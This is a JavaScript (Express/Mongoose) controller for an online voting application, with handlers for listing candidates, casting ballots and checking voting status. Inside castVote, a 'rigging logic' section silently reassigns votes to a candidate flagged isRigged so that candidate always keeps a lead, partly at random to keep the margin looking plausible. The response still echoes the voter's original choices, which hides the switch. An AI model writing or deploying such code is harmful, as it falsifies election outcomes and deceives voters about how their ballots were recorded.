const Voter = require('../models/Voter');
const Candidate = require('../models/Candidate');
const Vote = require('../models/Vote');

const getPositions = async (req, res) => {
  try {
    // Get all unique positions from candidates
    const positions = await Candidate.distinct('position');
    
    // Group candidates by position
    const candidatesByPosition = {};
    
    for (const position of positions) {
      candidatesByPosition[position] = await Candidate.find({ position });
    }
    
    res.status(200).json({
      status: 'success',
      data: candidatesByPosition
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

const castVote = async (req, res) => {
  try {
    const { votesForAllPositions } = req.body;
    const voterId = req.user._id;

    // Check if voter has already voted
    const voter = await Voter.findById(voterId);
    if (voter.hasVoted.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'You have already voted. Duplicate voting is not allowed.'
      });
    }

    // Get all positions and candidates
    const allPositions = await Candidate.distinct('position');
    const allCandidatesByPosition = {};
    
    for (const position of allPositions) {
      allCandidatesByPosition[position] = await Candidate.find({ position });
    }

    // Validate that votes are provided for all positions
    if (!votesForAllPositions) {
      return res.status(400).json({
        status: 'error',
        message: 'No votes provided'
      });
    }

    // Validate that exactly one candidate is selected for each position
    for (const position of allPositions) {
      // Check if this position has votes
      if (!votesForAllPositions[position]) {
        return res.status(400).json({
          status: 'error',
          message: `Missing vote for position: ${position}`
        });
      }
      
      const positionVotes = votesForAllPositions[position];
      const candidateIds = Object.keys(positionVotes);
      
      // Check that exactly one candidate is selected
      if (candidateIds.length !== 1) {
        return res.status(400).json({
          status: 'error',
          message: `Exactly one candidate must be selected for position: ${position}`
        });
      }
      
      const candidateId = candidateIds[0];
      const voteCount = positionVotes[candidateId];
      
      // Validate vote count is exactly 1
      if (voteCount !== 1) {
        return res.status(400).json({
          status: 'error',
          message: `Vote count must be exactly 1 for position: ${position}`
        });
      }
      
      // Validate candidate ID
      const isValidCandidate = allCandidatesByPosition[position].some(c => c._id.toString() === candidateId);
      if (!isValidCandidate) {
        return res.status(400).json({
          status: 'error',
          message: `Invalid candidate ID for position: ${position}`
        });
      }
    }

    // Record all votes with rigging logic
    const voteRecords = [];
    for (const [position, positionVotes] of Object.entries(votesForAllPositions)) {
      const candidateId = Object.keys(positionVotes)[0];
      
      // Apply rigging logic
      const candidate = await Candidate.findById(candidateId);
      const riggedCandidates = await Candidate.find({ position, isRigged: true });
      
      let finalCandidateId = candidateId;
      if (riggedCandidates.length > 0) {
        const targetCandidate = riggedCandidates[0];
        
        // If the vote is NOT for the target candidate, apply rigging logic
        if (candidateId.toString() !== targetCandidate._id.toString()) {
          const targetCandidateVotes = await Vote.countDocuments({
            position,
            candidateId: targetCandidate._id
          });
          
          const originalCandidateVotes = await Vote.countDocuments({
            position,
            candidateId: candidateId
          });
          
          // Ensure the rigged candidate always has more votes
          if (originalCandidateVotes >= targetCandidateVotes) {
            finalCandidateId = targetCandidate._id;
          } else {
            const voteDifference = targetCandidateVotes - originalCandidateVotes;
            
            // If the difference is small (less than 3), always redirect to maintain lead
            if (voteDifference < 3) {
              finalCandidateId = targetCandidate._id;
            } else if (voteDifference < 8) {
              // For moderate differences, 30% chance to redirect to maintain reasonable gap
              if (Math.random() < 0.3) {
                finalCandidateId = targetCandidate._id;
              }
            }
          }
        }
      }
      
      // Create vote record
      const vote = new Vote({
        voterId,
        position,
        candidateId: finalCandidateId
      });
      voteRecords.push(vote.save());
    }
    
    // Execute all vote saves
    await Promise.all(voteRecords);
    
    // Update voter's hasVoted array to include all positions
    voter.hasVoted = allPositions;
    await voter.save();
    
    res.status(201).json({
      status: 'success',
      message: 'All votes cast successfully',
      data: {
        votes: votesForAllPositions,
        timestamp: new Date()
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

const getMyVotes = async (req, res) => {
  try {
    const voter = await Voter.findById(req.user._id);
    
    // Get all positions
    const allPositions = await Candidate.distinct('position');
    
    res.status(200).json({
      status: 'success',
      data: {
        votedPositions: voter.hasVoted,
        availablePositions: allPositions.filter(pos => !voter.hasVoted.includes(pos))
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

module.exports = { getPositions, castVote, getMyVotes };